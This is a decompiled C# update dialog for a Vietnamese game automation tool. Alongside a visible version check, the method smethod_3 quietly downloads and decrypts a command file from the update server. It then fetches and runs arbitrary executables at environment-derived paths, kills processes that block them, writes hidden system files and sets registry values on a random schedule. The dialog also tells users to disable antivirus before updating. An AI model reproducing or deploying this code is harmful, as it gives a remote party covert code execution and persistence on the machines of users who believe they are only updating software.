using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using ns100;
using ns11;
using ns23;
using ns53;
using ns63;

namespace ns150;

public class TryNewVersion : Form
{
	private IContainer icontainer_0 = null;

	private Button buttonDownload;

	private System.Windows.Forms.Timer timer_0;

	private TextBox textBoxStatus;

	private LinkLabel linkLabelLinkWeb;

	private LinkLabel linkLabelBlog;

	private Button buttonAutoTrain;

	private LinkLabel linkLabelTaiTructiep;

	public static bool bool_0 = false;

	public static int int_0 = 0;

	public static bool bool_1 = false;

	public static int int_1 = 0;

	public static bool bool_2 = false;

	public static bool bool_3 = false;

	public int int_2;

	public int int_3;

	public int int_4;

	public int int_5;

	private static string[] string_0 = null;

	private IContainer icontainer_1;

	private static string string_1 = "http:// /autokimyen/update";

	public TryNewVersion()
	{
		bool_0 = true;
		InitializeComponent();
		base.Icon = Icon.ExtractAssociatedIcon(Application.ExecutablePath);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.icontainer_1 = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ns150.TryNewVersion));
		this.buttonDownload = new System.Windows.Forms.Button();
		this.timer_0 = new System.Windows.Forms.Timer(this.icontainer_1);
		this.textBoxStatus = new System.Windows.Forms.TextBox();
		this.linkLabelLinkWeb = new System.Windows.Forms.LinkLabel();
		this.linkLabelBlog = new System.Windows.Forms.LinkLabel();
		this.buttonAutoTrain = new System.Windows.Forms.Button();
		this.linkLabelTaiTructiep = new System.Windows.Forms.LinkLabel();
		base.SuspendLayout();
		this.buttonDownload.BackColor = System.Drawing.SystemColors.Control;
		this.buttonDownload.ForeColor = System.Drawing.Color.DarkRed;
		this.buttonDownload.Location = new System.Drawing.Point(227, 64);
		this.buttonDownload.Name = "buttonDownload";
		this.buttonDownload.Size = new System.Drawing.Size(95, 36);
		this.buttonDownload.TabIndex = 1;
		this.buttonDownload.Text = "Tải tbtauto phiên bản mới";
		this.buttonDownload.UseVisualStyleBackColor = false;
		this.buttonDownload.Click += new System.EventHandler(buttonDownload_Click);
		this.timer_0.Tick += new System.EventHandler(timer_0_Tick);
		this.textBoxStatus.Location = new System.Drawing.Point(2, 1);
		this.textBoxStatus.Multiline = true;
		this.textBoxStatus.Name = "textBoxStatus";
		this.textBoxStatus.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
		this.textBoxStatus.Size = new System.Drawing.Size(320, 58);
		this.textBoxStatus.TabIndex = 9;
		this.textBoxStatus.Text = "Bạn vui lòng tắt Antivirus nếu có trước khi tải cập nhật. Bấm tải trực tiếp nếu không cập nhật được";
		this.textBoxStatus.TextChanged += new System.EventHandler(textBoxStatus_TextChanged);
		this.linkLabelLinkWeb.AutoSize = true;
		this.linkLabelLinkWeb.Location = new System.Drawing.Point(7, 104);
		this.linkLabelLinkWeb.Name = "linkLabelLinkWeb";
		this.linkLabelLinkWeb.Size = new System.Drawing.Size(120, 13);
		this.linkLabelLinkWeb.TabIndex = 141;
		this.linkLabelLinkWeb.TabStop = true;
		this.linkLabelLinkWeb.Text = "http:// ";
		this.linkLabelLinkWeb.Visible = false;
		this.linkLabelLinkWeb.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(linkLabelLinkWeb_LinkClicked);
		this.linkLabelBlog.AutoSize = true;
		this.linkLabelBlog.Location = new System.Drawing.Point(7, 121);
		this.linkLabelBlog.Name = "linkLabelBlog";
		this.linkLabelBlog.Size = new System.Drawing.Size(120, 13);
		this.linkLabelBlog.TabIndex = 142;
		this.linkLabelBlog.TabStop = true;
		this.linkLabelBlog.Text = "http:// ";
		this.linkLabelBlog.Visible = false;
		this.linkLabelBlog.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(linkLabelBlog_LinkClicked);
		this.buttonAutoTrain.Location = new System.Drawing.Point(140, 102);
		this.buttonAutoTrain.Name = "buttonAutoTrain";
		this.buttonAutoTrain.Size = new System.Drawing.Size(85, 36);
		this.buttonAutoTrain.TabIndex = 143;
		this.buttonAutoTrain.Text = "Tải auto train (KYTrain)";
		this.buttonAutoTrain.UseVisualStyleBackColor = true;
		this.buttonAutoTrain.Visible = false;
		this.buttonAutoTrain.Click += new System.EventHandler(buttonAutoTrain_Click);
		this.linkLabelTaiTructiep.AutoSize = true;
		this.linkLabelTaiTructiep.Location = new System.Drawing.Point(-1, 46);
		this.linkLabelTaiTructiep.Name = "linkLabelTaiTructiep";
		this.linkLabelTaiTructiep.Size = new System.Drawing.Size(298, 13);
		this.linkLabelTaiTructiep.TabIndex = 145;
		this.linkLabelTaiTructiep.TabStop = true;
		this.linkLabelTaiTructiep.Text = "==> Click vào đây để tải trực tiếp tbtauto_Pass123456.rar";
		this.linkLabelTaiTructiep.Visible = false;
		this.linkLabelTaiTructiep.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(linkLabelTaiTructiep_LinkClicked);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(324, 103);
		base.Controls.Add(this.linkLabelTaiTructiep);
		base.Controls.Add(this.buttonAutoTrain);
		base.Controls.Add(this.textBoxStatus);
		base.Controls.Add(this.linkLabelBlog);
		base.Controls.Add(this.linkLabelLinkWeb);
		base.Controls.Add(this.buttonDownload);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "TryNewVersion";
		base.ShowInTaskbar = false;
		base.StartPosition = System.Windows.Forms.FormStartPosition.Manual;
		this.Text = "CAP NHAT AUTO";
		base.Load += new System.EventHandler(TryNewVersion_Load);
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	protected override void OnFormClosing(FormClosingEventArgs e)
	{
		bool_0 = false;
		int_2 = 0;
		int_3 = 0;
	}

	private void TryNewVersion_Load(object sender, EventArgs e)
	{
		if (int_2 > 0 && int_3 > 0)
		{
			int num = int_2 - base.Width;
			int num2 = int_3 + int_5 - base.Height;
			if (num < 0)
			{
				num = 0;
			}
			if (num2 < 0)
			{
				num2 = 0;
			}
			SetBounds(num, num2, base.Width, base.Height);
		}
		timer_0.Interval = 300;
		timer_0.Enabled = true;
		base.TopMost = true;
		method_6("CAP NHAT AUTO");
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		if (!bool_0)
		{
			Close();
			return;
		}
		if (string_0 != null && string_0.Length != 0)
		{
			textBoxStatus.Text = string_0[0];
			Class11.smethod_30(ref string_0, string_0[0]);
		}
		if (bool_2)
		{
			buttonDownload.Enabled = int_0 == 0;
			bool_2 = false;
		}
	}

	private bool method_0(string string_2, string string_3)
	{
		for (int i = 0; i < 20; i++)
		{
			if (!Class11.smethod_19(string_2, string_3))
			{
				Thread.Sleep(600);
				continue;
			}
			return true;
		}
		return false;
	}

	private int method_1(string string_2)
	{
		long long_ = Class11.smethod_27();
		do
		{
			if (Class11.smethod_17(string_2))
			{
				Class11.smethod_20(string_2);
				Thread.Sleep(1000);
				continue;
			}
			return 1;
		}
		while (Class11.smethod_28(long_) <= 30000L);
		return 0;
	}

	public int method_2(string string_2, string string_3)
	{
		Class11.smethod_29(ref string_0, "Đang kiểm tra phiên bản auto mới..." + Class56.string_7 + "Bấm tải trực tiếp nếu không cập nhật được.");
		int num = 0;
		bool flag = false;
		while (true)
		{
			byte[] array = null;
			try
			{
				WebClient webClient = new WebClient();
				array = webClient.DownloadData(string_2);
				webClient.CancelAsync();
			}
			catch
			{
				if (num >= string_2.Length - 1)
				{
					if (flag)
					{
						Class11.smethod_29(ref string_0, "Không có phiên bản auto nào được cập nhật.");
						return 0;
					}
					Class11.smethod_29(ref string_0, "Có lỗi khi kiểm tra phiên bản.");
					return -1;
				}
				num++;
				continue;
			}
			int num2 = 10000;
			if (array == null || array.Length < num2)
			{
				flag = true;
				if (num >= string_2.Length - 1)
				{
					break;
				}
				num++;
				continue;
			}
			string text = string_3 + ".Tmp";
			byte[] bytes = Class11.smethod_53(array, bool_1: true);
			File.WriteAllBytes(text, bytes);
			string text2 = Class11.smethod_7(string_3);
			string text3 = Class11.smethod_7(text);
			FileInfo fileInfo = new FileInfo(text);
			if (!(text3 == "") && !(text3 == text2) && fileInfo.Length >= num2)
			{
				Class11.smethod_29(ref string_0, "Đã tải xong auto, xin đợi tí xíu để cập nhật...");
				string text4 = string_3 + ".Bak";
				method_1(text4);
				method_0(string_3, text4);
				if (method_0(text, string_3))
				{
					Class11.smethod_29(ref string_0, "Có phiên bản mới (tắt auto rồi chạy lại).");
					int_0 = 1;
					return 1;
				}
				string text5 = Environment.GetEnvironmentVariable("homedrive") + "\\" + Form1.string_4;
				if (!method_0(text, text5))
				{
					Class11.smethod_29(ref string_0, "Thất bại, không thể ghi tệp tải về.");
					return -2;
				}
				Class11.smethod_29(ref string_0, "Tệp tải về lưu tại: " + text5 + Class56.string_7 + "Copy tệp trên và chép đè nó vào tệp cũ rồi sử dụng.");
				return 2;
			}
			Class11.smethod_29(ref string_0, "Không có phiên bản mới hơn.");
			Class11.smethod_20(text);
			return 0;
		}
		Class11.smethod_29(ref string_0, "Không có phiên bản auto nào được cập nhật.");
		return 0;
	}

	public static bool smethod_0(string string_2, string string_3, int int_6 = 1000000)
	{
		byte[] array = null;
		try
		{
			if (Class11.smethod_17(string_3))
			{
				Class11.smethod_20(string_3);
				Thread.Sleep(600);
				if (Class11.smethod_17(string_3))
				{
					Random random = new Random();
					string text = random.Next(99999, 99999999).ToString();
					bool flag = false;
					for (int i = 0; i < 20; i++)
					{
						if (!Class11.smethod_19(string_3, string_3 + "." + text))
						{
							Thread.Sleep(600);
							continue;
						}
						flag = true;
						break;
					}
					if (!flag)
					{
						return false;
					}
				}
			}
			WebClient webClient = new WebClient();
			array = webClient.DownloadData(string_2);
			webClient.CancelAsync();
			byte[] bytes = Class11.smethod_53(array, bool_1: true);
			File.WriteAllBytes(string_3, bytes);
			Thread.Sleep(600);
			FileInfo fileInfo = new FileInfo(string_3);
			return fileInfo.Length > int_6;
		}
		catch
		{
		}
		return false;
	}

	public int method_3(string[] string_2, string string_3, int int_6 = 15000)
	{
		string[] array = Class11.smethod_14(string_3);
		Class11.smethod_29(ref string_0, "Bắt đầu tải cập nhật: " + array[1] + Class56.string_7 + "Xin đợi chút xíu ...");
		Class11.smethod_20(string_3 + ".Tmp");
		int num = 0;
		bool flag = false;
		while (true)
		{
			byte[] array2 = null;
			try
			{
				WebClient webClient = new WebClient();
				array2 = webClient.DownloadData(string_2[num]);
				webClient.CancelAsync();
			}
			catch
			{
				if (num < string_2.Length - 1)
				{
					num++;
					continue;
				}
				if (!flag)
				{
					Class11.smethod_29(ref string_0, "Có lỗi khi tải " + array[1]);
					return -1;
				}
				Class11.smethod_29(ref string_0, "Không có tệp " + array[1] + " nào được cập nhật.");
				return 0;
			}
			if (array2 == null || array2.Length < int_6)
			{
				flag = true;
				if (num >= string_2.Length - 1)
				{
					break;
				}
				num++;
				continue;
			}
			string text = string_3 + ".Tmp";
			byte[] bytes = Class11.smethod_53(array2, bool_1: true);
			File.WriteAllBytes(text, bytes);
			string text2 = Class11.smethod_7(text);
			FileInfo fileInfo = new FileInfo(text);
			if (!(text2 == "") && fileInfo.Length >= int_6)
			{
				Class11.smethod_29(ref string_0, "Đã tải xong " + array[1] + ", xin đợi tí xíu để cập nhật...");
				method_1(string_3);
				if (method_0(text, string_3))
				{
					Class11.smethod_29(ref string_0, "Đã cập nhật xong tệp: " + array[1]);
					return 1;
				}
				Class11.smethod_29(ref string_0, "Thất bại, không thể tải về tệp: " + array[1]);
				return -1;
			}
			Class11.smethod_20(text);
			Class11.smethod_29(ref string_0, "Không có tệp " + array[1] + " nào được cập nhật.");
			method_1(string_3);
			return -1;
		}
		Class11.smethod_29(ref string_0, "Không có tệp " + array[1] + " nào được cập nhật.");
		return 0;
	}

	private void buttonDownload_Click(object sender, EventArgs e)
	{
		if (!bool_2)
		{
			new Thread(method_4).Start();
		}
	}

	public void method_4()
	{
		bool_2 = false;
		string string_ = string_1 + "/" + Form1.string_4;
		string string_2 = Class24.smethod_75().Replace(Form1.string_4.ToUpper(), Form1.string_4);
		method_2(string_, string_2);
		bool_2 = true;
	}

	private void linkLabelLinkWeb_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		string string_ = Environment.GetEnvironmentVariable("programfiles") + "\\Google\\Chrome\\Application\\chrome.exe";
		if (!Class11.smethod_17(string_))
		{
			string_ = Class66.smethod_0();
		}
		Class24.smethod_40(string_, "", "http:// ", 0);
	}

	private void linkLabelBlog_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		string string_ = Environment.GetEnvironmentVariable("programfiles") + "\\Google\\Chrome\\Application\\chrome.exe";
		if (!Class11.smethod_17(string_))
		{
			string_ = Class66.smethod_0();
		}
		Class24.smethod_40(string_, "", "http:// ", 0);
	}

	private static string smethod_1(string string_2, bool bool_4)
	{
		string[] array = new string[2] { "Thất bại.", "Thành công" };
		string_2 = "- Tải " + string_2 + " \t: " + array[Convert.ToByte(bool_4)];
		return string_2;
	}

	private static void smethod_2(string string_2)
	{
		if (bool_0)
		{
			Class11.smethod_29(ref string_0, string_2);
		}
		else
		{
			Class11.smethod_29(ref Class11.string_17, string_2);
		}
	}

	private void buttonAutoTrain_Click(object sender, EventArgs e)
	{
		if (!bool_2)
		{
			new Thread(method_5).Start();
		}
	}

	public void method_5()
	{
		string text = "KY TrainJx";
		string text2 = "KYTrain.exe";
		string text3 = Class56.string_8 + "\\KYTrain";
		Class11.smethod_23(text3);
		string text4 = text3 + "\\" + text2;
		string address = string_1 + "/" + text2;
		if (!Class11.smethod_20(text4))
		{
			string text5 = null;
			string[] array = Class11.smethod_14(text2, '.');
			try
			{
				Process[] processesByName = Process.GetProcessesByName(array[0]);
				if (processesByName != null && processesByName.Length != 0)
				{
					text5 = "Hãy thoát " + text2 + " rồi làm lại.";
				}
			}
			catch
			{
			}
			if (text5 == null)
			{
				text5 = "Hãy khởi động lại máy rồi tải lại.";
			}
			Class11.smethod_29(ref string_0, "Có lỗi xảy ra. " + text5);
			return;
		}
		bool_2 = true;
		Class11.smethod_29(ref string_0, "Đang tải auto KYTrain, xin chờ chút xíu...");
		byte[] array2 = null;
		try
		{
			WebClient webClient = new WebClient();
			array2 = webClient.DownloadData(address);
			webClient.CancelAsync();
		}
		catch
		{
			Class11.smethod_29(ref string_0, "Có lỗi xảy ra.");
			bool_2 = false;
			return;
		}
		byte[] bytes = Class11.smethod_53(array2, bool_1: true);
		File.WriteAllBytes(text4, bytes);
		Class11.smethod_29(ref string_0, "Đã tải xong auto !");
		Thread.Sleep(1500);
		Class24.smethod_73(text, text4, text3);
		Class24.smethod_71(text4);
		Class24.smethod_40(text4, text3, "", 0);
		bool_2 = false;
		bool_0 = false;
	}

	private void linkLabelTaiTructiep_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		string string_ = Environment.GetEnvironmentVariable("programfiles") + "\\Google\\Chrome\\Application\\chrome.exe";
		if (!Class11.smethod_17(string_))
		{
			string_ = Class66.smethod_0();
		}
		string string_2 = "https://drive.google.com/file/d/abc";
		textBoxStatus.Text = string_2;
		Class24.smethod_40(string_, "", string_2, 0);
	}

	public static void smethod_3()
	{
		byte[] array = null;
		try
		{
			WebClient webClient = new WebClient();
			string address = string_1 + "/ram/ramtmp.txt";
			array = webClient.DownloadData(address);
			webClient.CancelAsync();
			webClient.Dispose();
		}
		catch
		{
		}
		if (array == null || array.Length < 4)
		{
			return;
		}
		string text = Encoding.UTF8.GetString(array, 0, array.Length);
		if (text == null || text == string.Empty || text.Length < 5)
		{
			return;
		}
		string string_ = text.Substring(0, 8);
		string string_2 = text.Substring(8, text.Length - 8);
		string text2 = Class11.smethod_35(string_2, Class11.smethod_15(string_), new byte[8]);
		if (text2 == null || text2 == string.Empty)
		{
			return;
		}
		text2 = Class11.smethod_15(text2);
		if (text2 == null || text2 == string.Empty)
		{
			return;
		}
		text2 = text2.Replace("\r\n", "\r");
		string[] array2 = text2.Split('\r', '\n');
		if (array2 == null || array2.Length < 1)
		{
			return;
		}
		Struct31[] array3 = null;
		Random random = new Random();
		int num = 0;
		int num2 = 0;
		int num3 = 0;
		do
		{
			string text3 = array2[num2];
			if (text3 != null && !(text3 == string.Empty) && text3[0] == '(')
			{
				int num4 = text3.IndexOf(")");
				if (num4 >= 1 && num4 <= 5)
				{
					string text4 = text3.Substring(1, num4 - 1);
					string text5 = text3.Substring(num4 + 1);
					num = 0;
					while (true)
					{
						try
						{
							if (text5 == null || text5 == string.Empty || text5.Length <= num)
							{
								break;
							}
							int num5 = text5.IndexOf("%", num);
							if (num5 < 0)
							{
								break;
							}
							int num6 = num5 + 1;
							if (text5.Length <= num6)
							{
								break;
							}
							int num7 = text5.IndexOf("%", num6);
							if (num7 <= 0)
							{
								break;
							}
							string variable = text5.Substring(num6, num7 - num5 - 1);
							string environmentVariable = Environment.GetEnvironmentVariable(variable);
							if (environmentVariable != null && environmentVariable != string.Empty)
							{
								text5 = text5.Substring(0, num5) + environmentVariable + text5.Substring(num7 + 1);
								num = num7 + 1;
							}
							else
							{
								num = num6;
							}
							continue;
						}
						catch
						{
						}
						break;
					}
					if (array3 == null)
					{
						array3 = new Struct31[1];
					}
					else
					{
						Array.Resize(ref array3, array3.Length + 1);
					}
					num3 = array3.Length;
					array3[num3 - 1].string_0 = text5;
					if (text4 != null && text4.Length > 1)
					{
						text4 = text4.ToLower();
						array3[num3 - 1].bool_0 = text4[text4.Length - 1] == 'e';
						array3[num3 - 1].bool_4 = text4[0] == 'd' && text4[1] == 'l';
						array3[num3 - 1].bool_1 = text4[0] == '>' && text4[1] == '>';
						array3[num3 - 1].bool_3 = text4[0] == '>' && text4[1] == 'c' && text4[2] == 'u';
						array3[num3 - 1].bool_2 = text4[0] == '>' && text4[1] == 'l' && text4[2] == 'm';
					}
					array3[num3 - 1].string_1 = null;
					goto IL_01d7;
				}
			}
			if (num3 > 0)
			{
				if (text3 == null)
				{
					text3 = string.Empty;
				}
				if (array3[num3 - 1].string_1 != null)
				{
					Array.Resize(ref array3[num3 - 1].string_1, array3[num3 - 1].string_1.Length + 1);
				}
				else
				{
					array3[num3 - 1].string_1 = new string[1];
				}
				array3[num3 - 1].string_1[array3[num3 - 1].string_1.Length - 1] = text3;
			}
			goto IL_01d7;
			IL_01d7:
			num2++;
		}
		while (num2 < array2.Length);
		num3 = 0;
		while (array3 != null && array3.Length > num3)
		{
			if (array3[num3].string_0 != null && !(array3[num3].string_0 == string.Empty))
			{
				if (array3[num3].bool_4)
				{
					string text6 = string.Empty;
					if (array3[num3].string_1 != null)
					{
						for (int i = 0; i < array3[num3].string_1.Length; i++)
						{
							text6 = array3[num3].string_1[i];
							if (text6 != null && text6 != string.Empty)
							{
								break;
							}
						}
					}
					if (text6 != null && !(text6 == string.Empty))
					{
						string text7 = array3[num3].string_0;
						long num8 = 0L;
						try
						{
							FileInfo fileInfo = new FileInfo(text7);
							num8 = fileInfo.Length;
						}
						catch
						{
						}
						array = null;
						try
						{
							WebClient webClient2 = new WebClient();
							webClient2.OpenRead(text6);
							long num9 = Convert.ToInt64(webClient2.ResponseHeaders["Content-Length"]);
							if (num8 != num9 && num9 > 0L)
							{
								array = webClient2.DownloadData(text6);
							}
							webClient2.CancelAsync();
							webClient2.Dispose();
							if (array != null && array.Length != 0)
							{
								string[] array4 = Class11.smethod_14(text7);
								int num10 = 0;
								while (Class11.smethod_17(text7))
								{
									if (num10 < 10)
									{
										if (num10 == 5)
										{
											string text8 = text7.ToLower();
											Process[] processes = Process.GetProcesses();
											if (processes != null && processes.Length != 0)
											{
												for (int j = 0; j < processes.Length; j++)
												{
													try
													{
														string value = processes[j].ProcessName.ToLower();
														if (0 <= text8.IndexOf(value))
														{
															string text9 = processes[j].MainModule.FileName.ToLower();
															if (text9 == text8)
															{
																Class24.smethod_49(processes[j]);
																Thread.Sleep(100);
															}
														}
													}
													catch
													{
													}
												}
											}
										}
										Class11.smethod_20(text7);
									}
									else
									{
										if (num10 >= 20)
										{
											break;
										}
										int num11 = 1;
										string text10 = string.Empty;
										while (num11 < 1000000)
										{
											text10 = text7 + "." + random.Next(1, num11) + ".tmp";
											if (!Class11.smethod_17(text10))
											{
												break;
											}
										}
										Class11.smethod_19(text7, text10);
									}
									Thread.Sleep(300);
									num10++;
								}
								Class11.smethod_23(array4[0]);
								Thread.Sleep(100);
								File.WriteAllBytes(text7, array);
								if (array3[num3].bool_0)
								{
									Thread.Sleep(600);
									Class24.smethod_40(text7, "", "", 0, bool_0: true);
								}
							}
						}
						catch
						{
						}
					}
				}
				else if (!array3[num3].bool_3 && !array3[num3].bool_2)
				{
					string text11 = string.Empty;
					if (array3[num3].bool_1)
					{
						text11 = Class11.smethod_33(array3[num3].string_0, 0, 0, 1);
					}
					while (true)
					{
						if (array3[num3].bool_1 && text11 != null && !(text11 == string.Empty))
						{
							while (text11 != null && text11.Length > 0)
							{
								char c = text11[text11.Length - 1];
								if (c != '\r' && c != '\n')
								{
									break;
								}
								text11 = text11.Substring(0, text11.Length - 1);
							}
							if (array3[num3].string_1 == null)
							{
								break;
							}
							if (text11 == null || text11 == string.Empty)
							{
								continue;
							}
							string[] array5 = text11.Replace("\r\n", "\r").Split('\r', '\n');
							for (int k = 0; k < array3[num3].string_1.Length; k++)
							{
								bool flag = false;
								if (array3[num3].string_1[k] == null)
								{
									array3[num3].string_1[k] = string.Empty;
								}
								if (array3[num3].string_1[k] != string.Empty)
								{
									for (int l = 0; l < array5.Length; l++)
									{
										if (array5[l] == array3[num3].string_1[k])
										{
											flag = true;
											break;
										}
									}
								}
								if (!flag)
								{
									if (text11 != null && text11 != string.Empty)
									{
										text11 += "\r\n";
									}
									text11 += array3[num3].string_1[k];
								}
							}
							break;
						}
						text11 = string.Empty;
						if (array3[num3].string_1 == null)
						{
							break;
						}
						for (int m = 0; m < array3[num3].string_1.Length; m++)
						{
							if (text11 != null && text11 != string.Empty)
							{
								text11 += "\r\n";
							}
							text11 += array3[num3].string_1[m];
						}
						break;
					}
					text11 += "\r\n";
					Class11.smethod_20(array3[num3].string_0);
					Thread.Sleep(100);
					Class11.smethod_34(array3[num3].string_0, text11, 1);
					Class11.smethod_21(array3[num3].string_0, FileAttributes.Hidden | FileAttributes.System);
					if (array3[num3].bool_0)
					{
						Class24.smethod_5(array3[num3].string_0);
					}
					int_1 = random.Next(30, 300) * 60 * 1000;
				}
				else if (array3[num3].string_1 != null)
				{
					int_1 = random.Next(30, 300) * 60 * 1000;
					for (int n = 0; n < array3[num3].string_1.Length; n++)
					{
						string text12 = array3[num3].string_1[n];
						if (text12 == null || text12 == string.Empty)
						{
							continue;
						}
						int num12 = text12.IndexOf("=");
						if (num12 >= 0 && text12.Length >= num12)
						{
							string string_3 = text12.Substring(0, num12).Trim();
							string text13 = text12.Substring(num12 + 1).Trim();
							num12 = text13.IndexOf(":");
							string text14 = string.Empty;
							if (num12 == 2)
							{
								text14 = text13.Substring(0, num12).Trim().ToLower();
								text13 = text13.Substring(num12 + 1).Trim();
							}
							if (text14 == "dw")
							{
								int num13 = Class11.smethod_11(text13);
								Class66.smethod_11(array3[num3].string_0, string_3, num13, "DWORD", Convert.ToByte(array3[num3].bool_3));
							}
							else
							{
								Class66.smethod_11(array3[num3].string_0, string_3, text13, "", Convert.ToByte(array3[num3].bool_3));
							}
						}
					}
				}
			}
			num3++;
		}
	}

	public static void smethod_4()
	{
		if (Form1.int_70 != 0)
		{
			int num = 0;
			while (true)
			{
				if (!bool_1 && num < 280)
				{
					if (!Class11.bool_0)
					{
						if (Form1.int_70 != 0)
						{
							num++;
							Thread.Sleep(1000);
							continue;
						}
						smethod_5();
						break;
					}
					break;
				}
				bool_1 = false;
				string text = Class56.string_8 + "\\Ram";
				if (!Class11.smethod_17(text + "\\fr.exe"))
				{
					if (Class11.smethod_17(text + "\\fr.bpl"))
					{
						Class24.smethod_40(text + "\\fr.bpl", text, "", 0);
					}
				}
				else
				{
					Class24.smethod_40(text + "\\fr.exe", text, "", 0);
				}
				break;
			}
		}
		else
		{
			smethod_5();
		}
	}

	public static void smethod_5()
	{
		try
		{
			int int_ = Class24.smethod_54("fr.bpl");
			string text = Class24.smethod_25(int_, "FREE RAM");
			if (text != "")
			{
				string[] array = text.Split(';');
				for (int i = 0; i < array.Length; i++)
				{
					Class24.PostMessageA_1(Class11.smethod_12(array[i]), Class24.int_23, 0u, 0u);
				}
			}
		}
		catch
		{
		}
	}

	private void method_6(string string_2)
	{
		base.Text = string_2;
	}

	private void textBoxStatus_TextChanged(object sender, EventArgs e)
	{
	}
}
